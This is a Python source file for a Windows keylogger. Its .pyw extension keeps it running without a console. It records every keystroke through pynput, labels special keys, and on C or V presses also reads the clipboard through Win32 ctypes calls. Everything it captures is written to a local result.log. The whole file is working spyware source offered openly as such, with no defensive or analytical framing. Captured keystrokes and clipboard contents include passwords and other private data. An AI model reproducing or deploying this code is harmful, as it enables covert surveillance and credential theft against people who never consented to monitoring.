# File: keylogger.pyw
# Python Version: 3
# Author: memecoder
# Platform: Windows

# Library imports
import ctypes
from pynput import keyboard
from pynput.keyboard import Key

# Special keys dictionary
special_keys = {
    Key.alt: " [Alt] ",
    Key.alt_l: " [Alt_L] ",
    Key.alt_r: " [Alt_R] ",
    Key.alt_gr: " [AltGr] ",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: " [CapsLock] ",
    Key.cmd: " [Cmd] ",
    Key.cmd_l: " [Cmd_L] ",
    Key.cmd_r: " [Cmd_R] ",
    Key.ctrl: " [Ctrl] ",
    Key.ctrl_l: " [Ctrl_L] ",
    Key.ctrl_r: " [Ctrl_R] ",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.end: " [End] ",
    Key.enter: " \n ",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f12: " [F12] ",
    Key.home: " [Home] ",
    Key.left: " [Left] ",
    Key.page_down: " [PageDown] ",
    Key.page_up: " [PageUp] ",
    Key.right: " [Right] ",
    Key.shift: " [Shift] ",
    Key.shift_l: " [Shift_L] ",
    Key.shift_r: " [Shift_R] ",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
    Key.insert: " [Insert] ",
    Key.menu: " [Menu] ",
    Key.num_lock: " [NumLock] ",
    Key.pause: " [Pause] ",
    Key.print_screen: " [PrintScreen] ",
    Key.scroll_lock: " [ScrollLock] "
}

# Set to track pressed keys
pressed_keys = set()

# Function to get clipboard data
def get_clipboard():
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    CF_TEXT = 1
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard
    try:
        if IsClipboardFormatAvailable(CF_TEXT):
            data = GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            return value.decode('utf-8', errors='ignore')
    finally:
        CloseClipboard()

# Function to handle key press events
def on_press(key):
    pressed_keys.add(key)
    with open("result.log", "a", encoding='utf-8') as file:
        try:
            if key in special_keys:
                file.write(special_keys[key])
            elif hasattr(key, 'char') and key.char and key.char.lower() in ('c', 'v'):
                clipboard_data = get_clipboard()
                if clipboard_data:
                    file.write("/n[Clipboard]: " + str(clipboard_data) + " /n ")
                else:
                    pass
            else:
                file.write(key.char)
        except AttributeError:
            file.write(str(key))

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
